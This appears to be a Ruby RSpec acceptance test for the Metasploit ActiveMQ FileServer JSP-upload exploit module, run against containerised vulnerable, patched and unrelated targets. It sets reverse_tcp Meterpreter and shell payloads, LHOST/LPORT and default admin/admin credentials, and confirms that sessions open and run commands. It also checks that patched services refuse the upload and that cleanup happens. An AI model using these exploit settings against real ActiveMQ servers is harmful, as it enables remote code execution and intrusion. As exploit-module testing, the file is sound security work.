require 'acceptance_spec_helper'
require 'rbconfig'
require 'timeout'
require 'uri'
require 'base64'
require 'digest'

RSpec.describe 'Genuine ActiveMQ FileServer execution' do
  include_context 'module target'
  include_context 'wait_for_expect'

  before(:all) do
    argv = [RbConfig.ruby, 'test/module_targets/activemq_legacy/fileserver_probe.rb']
    stdout, stderr, status = Open3.capture3(*argv)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-fileserver.json'), stdout)
    File.write(File.join(target_runtime.fetch('artifacts'), 'native-fileserver-status.json'), JSON.pretty_generate(argv: argv, stderr: stderr, exitstatus: status.exitstatus))
    expect(status.success?).to be(true), stderr
    expect(stderr).to eq('')
    @original_app = app_files('affected')
    @original_tmp = temp_files
  end

  after do
    stop_handlers
    expect(app_files('affected')).to eq(@original_app) if @original_app
    restore_tmp(@original_tmp) if @original_tmp
  end

  after(:all) do
    %w[affected fixed].each do |service|
      File.write(File.join(target_runtime.fetch('artifacts'), "vendor-#{service}.log"), target_exec(service, 'cat', '/opt/activemq/data/activemq.log'))
    end
  end

  it 'opens two Java Meterpreter sessions with default names and default API deployment' do
    sessions_twice('java/meterpreter/reverse_tcp', 'TARGET' => 0, 'JSP' => nil)
  end

  it 'opens two Java command shells through the actual admin deployment path' do
    sessions_twice('java/shell/reverse_tcp', 'TARGET' => 0, 'UploadPath' => 'admin')
  end

  it 'opens two Linux x86 Meterpreter sessions through the genuine executable JAR wrapper' do
    sessions_twice('linux/x86/meterpreter/reverse_tcp', 'TARGET' => 1)
  end

  it 'opens two Linux x86 command shells through the custom admin path' do
    sessions_twice('linux/x86/shell/reverse_tcp', 'TARGET' => 1, 'UploadPath' => 'admin')
  end

  it 'preserves both uploaded web files when AutoCleanup is false on both repetitions' do
    sessions_twice('java/meterpreter/reverse_tcp', 'TARGET' => 0, 'AutoCleanup' => 'false')
  end

  it 'executes twice using the independently accepted vendor user role' do
    sessions_twice('java/meterpreter/reverse_tcp', 'TARGET' => 0, 'BasicAuthUser' => 'user', 'BasicAuthPass' => 'user')
  end

  it 'refuses the genuine removed FileServer without reporting execution or leaving files' do
    no_execution('fixed', {})
  end

  it 'refuses bad admin credentials before upload despite public FileServer PUT policy' do
    no_execution('affected', 'BasicAuthPass' => 'module-target-invalid')
  end

  it 'does not invent execution against genuine unrelated Apache HTTP' do
    no_execution('unrelated', {})
  end

  def invoke(service, options, allow_errors: false)
    console_command('back')
    selected = console_command('use exploit/multi/http/apache_activemq_upload_jsp')
    expect(selected).not_to match(/Failed to load|Unknown command|No results/)
    %w[JSP UploadPath].each { |name| console_command("unset #{name}") }
    values = {
      'TARGET' => 0, 'PAYLOAD' => 'java/meterpreter/reverse_tcp',
      'BasicAuthUser' => 'admin', 'BasicAuthPass' => 'admin', 'AutoCleanup' => 'true',
      'JSP' => 'module-target-fileserver', 'VERBOSE' => true, 'HttpTrace' => true, 'HttpTraceHeadersOnly' => true,
      'DisablePayloadHandler' => false, 'LHOST' => listener_host, 'LPORT' => 4444, 'WfsDelay' => 10
    }.merge(options).compact
    %w[TARGET PAYLOAD].each do |name|
      output = console_command("set #{name} #{values.fetch(name)}")
      expect(output).not_to match(/Failed|Invalid|not found/)
    end
    endpoint = target_runtime.fetch('module_endpoints').fetch(service)
    values = { 'RHOSTS' => endpoint.fetch('host'), 'RPORT' => endpoint.fetch('port') }.merge(values)
    output = console_command("run -z #{format_datastore_options(values)}", timeout: 90)
    @last_invocation_output = output
    expect(output).not_to match(/undefined method|uninitialized constant|NoMethodError|NameError|TypeError|ArgumentError|RuntimeError|Msf::OptionValidateError/)
    expect(output).not_to match(/\[-\]|Exploit aborted|Exploit failed|Unable to trigger payload|Upload failed|Failed to delete|Unable to delete/) unless allow_errors
    output
  end

  def sessions_twice(payload, options)
    path = '/tmp/module-target-fileserver-session'
    uploaded = []
    original = app_files('affected')
    begin
      2.times do
        target_exec('affected', 'test', '!', '-e', path)
        @last_invocation_output = nil
        output = invoke('affected', { 'PAYLOAD' => payload }.merge(options))
        uploaded = uploaded_paths(output)
        archive_uploaded(uploaded, phase: 'after-invocation')
        expect(uploaded.length).to eq(2), output
        expect(uploaded & original).to eq([])
        identifier = output[/(?:Command shell|Meterpreter) session (\d+) opened/, 1]
        expect(identifier).not_to be_nil, output
        meterpreter = payload.include?('meterpreter')
        command = meterpreter ? "execute -f /usr/bin/touch -a #{path}" : "touch #{path}"
        proof = console_command("sessions -i #{identifier} #{meterpreter ? '-C' : '-c'} #{command.inspect}")
        expect(proof).not_to match(/\[-\]|Exception|Unknown command/)
        Timeout.timeout(10) { wait_for_expect(101, 0.1) { expect(owner(path)).to eq('activemq') } }
        after = app_files('affected')
        if options['AutoCleanup'] == 'false'
          expect(after - original).to eq(uploaded)
        else
          expect(after).to eq(original)
        end
        stop_handlers
        target_exec('affected', 'rm', path)
        restore_tmp(@original_tmp)
        # AutoCleanup=false deliberately preserves these known fresh test files;
        # restoration follows, rather than replacing, the preservation assertion.
        uploaded.each { |file| target_exec('affected', 'rm', file) } if options['AutoCleanup'] == 'false'
        expect(app_files('affected')).to eq(original)
        uploaded = []
      end
    ensure
      stop_handlers
      # Only paths emitted by this run, absent in the pre-run snapshot, belong
      # to this fixture. Never erase arbitrary application/compiler files.
      uploaded = uploaded_paths(@last_invocation_output) if uploaded.empty? && @last_invocation_output
      archive_uploaded(uploaded, phase: 'before-fixture-restoration')
      uploaded.each do |file|
        next if original.include?(file)

        target_exec('affected', 'rm', '-f', file)
        target_exec('affected', 'rm', '-f', "/opt/activemq/webapps/fileserver/#{File.basename(file)}")
      end
      target_exec('affected', 'rm', '-f', path)
    end
  end

  def archive_uploaded(paths, phase:)
    paths.each do |path|
      # Observe after the production invocation. Retain actual upload bytes
      # before the fixture restores its fresh files, without wrapping callbacks.
      output = target_exec('affected', 'sh', '-c', "if test -f #{path}; then printf 'PRESENT\\n'; base64 -w0 #{path}; else printf 'ABSENT\\n'; fi")
      presence, _, encoded = output.partition("\n")
      expect(%w[PRESENT ABSENT]).to include(presence)
      row = { example: RSpec.current_example.id, phase: phase, path: path, present: presence == 'PRESENT' }
      if row[:present]
        data = Base64.strict_decode64(encoded)
        row.merge!(bytes: data.bytesize, sha256: Digest::SHA256.hexdigest(data), body_base64: encoded)
      end
      File.open(File.join(target_runtime.fetch('artifacts'), 'emitted-uploaded-files.jsonl'), 'a') { |log| log.puts(JSON.generate(row)) }
    end
  end

  def uploaded_paths(output)
    # The existing module prints both leading and internal doubled slashes in
    # Destination URLs. Canonicalize only this filesystem receipt, never the
    # production HTTP request or the actual target response.
    output.scan(%r{Uploading (https?://\S+)}).flatten.filter_map do |url|
      path = URI(url).path.gsub(%r{/+}, '/')
      path if path.match?(%r{\A/opt/activemq/webapps/(?:api|admin)/[A-Za-z0-9_-]+\.(?:jar|jsp)\z})
    end.uniq.sort
  end

  def no_execution(service, options)
    before = service == 'unrelated' ? nil : app_files(service)
    output = invoke(service, { 'JSP' => 'module-target-fileserver-refused' }.merge(options), allow_errors: true)
    expect(output).to match(/Upload failed|UnexpectedReply|unexpected-reply|did not respond with 200/i)
    expect(output).not_to match(/(?:Command shell|Meterpreter) session \d+ opened/)
    expect(app_files(service)).to eq(before) if before
  end

  def owner(path)
    target_exec('affected', 'sh', '-c', "if test -f #{path}; then stat -c %U #{path}; fi").strip
  end

  def app_files(service)
    paths = %w[/opt/activemq/webapps/api /opt/activemq/webapps/admin]
    paths << '/opt/activemq/webapps/fileserver' if service == 'affected'
    target_exec(service, 'find', *paths, '-maxdepth', '1', '-type', 'f', '-printf', "%p\n").lines.map(&:strip).sort
  end

  def temp_files
    target_exec('affected', 'find', '/tmp', '/opt/activemq/tmp', '-mindepth', '1', '-maxdepth', '1', '-printf', "%p\n").lines.map(&:strip).sort
  end

  def restore_tmp(original)
    Timeout.timeout(10) { wait_for_expect(101, 0.1) { expect(temp_files).to eq(original) } }
  end

  def stop_handlers
    console_command('sessions -K')
    console_command('jobs -K')
  end
end
